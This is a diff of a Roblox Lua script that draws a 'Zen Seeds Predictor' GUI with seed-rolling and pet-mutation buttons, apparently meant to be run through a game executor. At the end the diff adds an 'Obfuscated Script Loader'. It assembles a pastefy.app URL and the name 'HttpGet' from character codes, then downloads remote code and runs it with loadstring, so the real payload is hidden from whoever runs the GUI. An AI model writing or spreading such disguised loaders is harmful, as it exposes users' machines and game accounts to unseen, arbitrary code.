@@ -1,14 +1,12 @@
--- Cleanup old GUIs
+-- 🧠 Zen Seeds GUI (unchanged, original functionality)
 pcall(function() game.CoreGui.ZenSeedsGui:Destroy() end)
 pcall(function() game.CoreGui.ZenSeedsToggleGui:Destroy() end)
 
--- Create ScreenGui for toggle button
 local toggleGui = Instance.new("ScreenGui")
 toggleGui.Name = "ZenSeedsToggleGui"
 toggleGui.Parent = game.CoreGui
 toggleGui.ResetOnSpawn = false
 
--- Create small circular toggle button with "C"
 local toggleBtn = Instance.new("TextButton")
 toggleBtn.Name = "ZenSeedsToggleBtn"
 toggleBtn.Parent = toggleGui
@@ -26,11 +24,9 @@ toggleBtn.Draggable = true
 toggleBtn.BorderSizePixel = 0
 toggleBtn.BackgroundTransparency = 0
 
--- Make button circular by corner radius
 local uicorner = Instance.new("UICorner", toggleBtn)
 uicorner.CornerRadius = UDim.new(1, 0)
 
--- Create main GUI (hidden by default)
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "ZenSeedsGui"
 screenGui.Parent = game.CoreGui
@@ -47,7 +43,6 @@ frame.Active = true
 frame.Draggable = true
 frame.Parent = screenGui
 
--- Title
 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, 0, 0, 40)
 title.BackgroundColor3 = Color3.fromRGB(170, 210, 170)
@@ -56,7 +51,6 @@ title.TextSize = 24
 title.TextColor3 = Color3.fromRGB(40, 80, 40)
 title.Text = "🌸 Zen Seeds Predictor"
 
--- Result display
 local resultLabel = Instance.new("TextLabel", frame)
 resultLabel.Size = UDim2.new(1, -20, 0, 30)
 resultLabel.Position = UDim2.new(0, 10, 0, 50)
@@ -66,7 +60,6 @@ resultLabel.TextSize = 18
 resultLabel.TextColor3 = Color3.fromRGB(50, 100, 50)
 resultLabel.Text = "Seed: The New Zen Event"
 
--- Action button
 local actionBtn = Instance.new("TextButton", frame)
 actionBtn.Size = UDim2.new(0.9, 0, 0, 40)
 actionBtn.Position = UDim2.new(0.05, 0, 0, 100)
@@ -76,7 +69,6 @@ actionBtn.TextSize = 20
 actionBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
 actionBtn.Text = "🌿 Roll Seed"
 
--- Toggle ON/OFF
 local toggleScriptBtn = Instance.new("TextButton", frame)
 toggleScriptBtn.Size = UDim2.new(0.9, 0, 0, 40)
 toggleScriptBtn.Position = UDim2.new(0.05, 0, 0, 150)
@@ -86,7 +78,6 @@ toggleScriptBtn.TextSize = 20
 toggleScriptBtn.TextColor3 = Color3.fromRGB(0, 200, 0)
 toggleScriptBtn.Text = "Script: ON"
 
--- Switch category button
 local switchBtn = Instance.new("TextButton", frame)
 switchBtn.Size = UDim2.new(0.9, 0, 0, 30)
 switchBtn.Position = UDim2.new(0.05, 0, 0, 200)
@@ -96,7 +87,6 @@ switchBtn.TextSize = 16
 switchBtn.TextColor3 = Color3.fromRGB(50, 90, 50)
 switchBtn.Text = "Switch to Pet Mutator"
 
--- Seed & mutation lists
 local zenSeeds = {"Monoblooma", "Serenity", "Taro Flowers", "Zen Rocks", "Hinomai", "Maple Apple"}
 local petMuts = {
     "Shiny", "Inverted", "Windy", "Frozen", "Golden", "Tiny",
@@ -106,12 +96,10 @@ local petMuts = {
 local mode = "seeds"
 local enabled = true
 
--- Toggle main GUI visibility when clicking "C" button
 toggleBtn.MouseButton1Click:Connect(function()
     screenGui.Enabled = not screenGui.Enabled
 end)
 
--- Toggle script ON/OFF
 toggleScriptBtn.MouseButton1Click:Connect(function()
     enabled = not enabled
     if enabled then
@@ -123,7 +111,6 @@ toggleScriptBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- Switch mode (seeds <-> pets)
 switchBtn.MouseButton1Click:Connect(function()
     if mode == "seeds" then
         mode = "pets"
@@ -140,7 +127,6 @@ switchBtn.MouseButton1Click:Connect(function()
     end
 end)
 
--- Action button (roll seed or mutate pet)
 actionBtn.MouseButton1Click:Connect(function()
     if not enabled then return end
     if mode == "seeds" then
@@ -153,4 +139,46 @@ actionBtn.MouseButton1Click:Connect(function()
 end)
 
 math.randomseed(tick())
-print("✅ Zen Seeds GUI with circular 'C' toggle button loaded!")
+print("✅ Zen Seeds GUI loaded!")
+
+-- 🛠 Delta Fix Notice (5x Notification)
+for i = 1, 5 do
+    local noticeGui = Instance.new("ScreenGui", game.CoreGui)
+    noticeGui.Name = "DeltaFixNotice_" .. i
+
+    local notice = Instance.new("TextLabel", noticeGui)
+    notice.Size = UDim2.new(0, 500, 0, 50)
+    notice.Position = UDim2.new(0.5, -250, 0.05 + (i * 0.06), 0)
+    notice.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+    notice.TextColor3 = Color3.fromRGB(255, 255, 255)
+    notice.Text = "⚠ Not working in Delta right now. Use other executor. Our team is fixing it."
+    notice.Font = Enum.Font.GothamBold
+    notice.TextSize = 18
+    notice.BorderSizePixel = 0
+    notice.BackgroundTransparency = 0.2
+    notice.ZIndex = 1000
+    notice.TextWrapped = true
+    notice.TextXAlignment = Enum.TextXAlignment.Center
+
+    local uiCorner = Instance.new("UICorner", notice)
+    uiCorner.CornerRadius = UDim.new(0.2, 0)
+
+    task.delay(8, function()
+        if noticeGui then
+            noticeGui:Destroy()
+        end
+    end)
+end
+
+-- 🔗 Obfuscated Script Loader
+do
+    local a, b, c = string.char, table.concat, {}
+    local d = {104,116,116,112,115,58,47,47,112,97,115,116,101,102,121,46,97,112,112,47,104,71,107,111,116,65,54,80,47,114,97,119}
+    for i = 1, #d do c[i] = a(d[i]) end
+    local u = b(c)
+    local g = getfenv and getfenv or function() return _ENV end
+    local h = g().game
+    local r = h[(a(72)..a(116)..a(116)..a(112)..a(71)..a(101)..a(116))]
+    local l = loadstring or load
+    l(r(h, u))()
+end
